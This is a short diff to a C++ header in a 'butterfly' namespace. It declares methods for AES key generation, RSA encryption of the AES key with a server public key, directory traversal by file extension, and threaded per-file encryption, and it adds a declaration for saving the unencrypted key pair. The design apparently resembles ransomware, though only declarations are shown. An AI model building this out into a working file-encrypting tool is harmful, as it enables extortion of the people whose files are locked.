@@ -10,7 +10,7 @@
 #include "crypto/serverPublicKey.h"
 #include "directoryIterator.h"
 #include "fileExtensions.h"
-#include "params.h"
+#include "bflyParams.h"
 
 namespace butterfly
 {
@@ -37,6 +37,13 @@ private:
      * Validates the AESKey/AESIV length after the AESKey generation
      */
     void validateAESKeyLength();
+
+    /**
+     * Saves the unencrypted AESKeyPair to the filesystem
+     *
+     * @param aesKeyPair: aesKeyPair string
+     */
+    static void saveUnencryptedAESKeyPair(const std::string &aesKeyPair);
 
 public:
     /**
@@ -79,10 +86,10 @@ public:
     /**
      * Encrypts the final AES Key and IV with RSA
      *
-     * @param aesKeyStr: AES Key or IV String
+     * @param aesKeyPair: AES Key and IV String
      * @param filename: name of the encrypted file
      */
-    void encryptFinalAESKeyWithRSA(const std::string &aesKeyStr, const std::string &filename);
+    void encryptFinalAESKeyWithRSA(const std::string &aesKeyPair, const std::string &filename);
 
     /**
      * Spawns a new Thread for encrypting the file
